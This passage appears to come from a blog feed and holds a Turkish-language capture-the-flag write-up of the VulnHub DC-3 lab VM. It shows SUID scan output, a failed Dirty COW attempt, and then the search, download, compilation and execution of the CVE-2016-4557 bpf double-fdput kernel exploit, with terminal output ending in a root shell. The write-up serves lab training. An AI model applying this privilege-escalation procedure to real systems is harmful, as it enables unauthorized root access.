+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">18216</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /usr/bin/pkexec
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">39560</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/chsh
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">48264</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/chfn
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">36288</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newuidmap
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34680</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newgrp
+-rwsr-sr-x <span style="color:#ae81ff">1</span> daemon daemon <span style="color:#ae81ff">50748</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2016</span> /usr/bin/at
+
+<span style="color:#75715e">### SCAN COMPLETE ####################################</span>
+</code></pre></div><p>Kernel sürümünün eski olduğu görülmektedir. İlk olarak Dirty-COW adı verilen zafiyet ile yetki yükseltilmeye çalışılmıştır. Ancak www-data kullanıcısı login işlemine kapalı olduğundan /etc/passwd üzerinde yapılan her değişiklikten sonra sistem crash olmuştur.</p>
+<p><em>Linux Kernel 4.4.x çekirdeğine sahip Ubuntu 16.x sisteminde “Linux Kernel 4.4.x (Ubuntu 16.04) – ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation” isimli CVE-2016-4557 ID’li kritik bir zafiyet bulunmaktadır.</em> Searchsploit üzerinde arama yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit Linux Kernel 4.4.x
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                            |  Path
+------------------------------------------------------------------------------------------ ---------------------------------
+Linux Kernel 4.4.x <span style="color:#f92672">(</span>Ubuntu 16.04<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;double-fdput()&#39;</span> bpf<span style="color:#f92672">(</span>BPF_PROG_LOAD<span style="color:#f92672">)</span> Privilege Escalat | linux/local/39772.txt
+</code></pre></div><p>Searchsploit üzerinden exploit bilgisayara indirilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m <span style="color:#ae81ff">39772</span>
+</code></pre></div><p>İndirilen exploit dosyası localhosttan hedef makinaya indirilir. Daha sonra zip ve tar arşiv dosyaları çıkarılır.</p>
+<pre><code class="language-terminal" data-lang="terminal">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls -lsa
+ls -lsa
+total 28
+4 drwxr-x--- 2 www-data www-data 4096 Apr 26  2016 .
+4 drwxr-xr-x 4 www-data www-data 4096 Sep 29 08:29 ..
+4 -rwxr-x--- 1 www-data www-data  155 Apr 26  2016 compile.sh
+8 -rw-r----- 1 www-data www-data 4188 Apr 26  2016 doubleput.c
+4 -rw-r----- 1 www-data www-data 2186 Apr 26  2016 hello.c
+4 -rw-r----- 1 www-data www-data  255 Apr 26  2016 suidhelper.c
+www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
+./compile.sh
+doubleput.c: In function 'make_setuid':
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)&quot;&quot;
+               ^
+</code></pre><p>Derleme sonucu oluşturulan binary dosyası çalıştırılarak yetki yükseltme işlemi tamamlanır.</p>
+<pre><code class="language-terminal" data-lang="terminal">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
+./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
+cd /root
+root@DC-3:/root# ls
+ls
+the-flag.txt
+</code></pre>
+    <img src="/images/vulnhub/dc3/flag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>VULNHUB DC-2 Write Up</title>
